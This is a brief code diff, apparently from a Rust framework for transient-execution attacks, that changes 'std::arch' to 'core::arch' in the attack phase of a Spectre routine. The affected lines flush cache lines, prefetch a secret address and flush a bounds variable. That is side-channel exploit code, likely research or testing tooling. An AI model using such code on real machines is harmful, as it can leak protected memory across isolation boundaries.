@@ -117,15 +117,15 @@ impl Method for Spectre {
 
                 // attack phase
                 flush_measurement_area();
-                std::arch::x86_64::_mm_prefetch(
+                core::arch::x86_64::_mm_prefetch(
                     SECRET as *const _ as *const i8,
-                    std::arch::x86_64::_MM_HINT_T0,
+                    core::arch::x86_64::_MM_HINT_T0,
                 );
-                std::arch::x86_64::_mm_prefetch(
+                core::arch::x86_64::_mm_prefetch(
                     &BASE_ADDR as *const usize as *const i8,
-                    std::arch::x86_64::_MM_HINT_T0,
+                    core::arch::x86_64::_MM_HINT_T0,
                 );
-                std::arch::x86_64::_mm_clflush(&SPECTRE_LIMIT as *const u64 as *const u8);
+                core::arch::x86_64::_mm_clflush(&SPECTRE_LIMIT as *const u64 as *const u8);
 
                 preload_op();
                 asm!("mfence", "lfence");
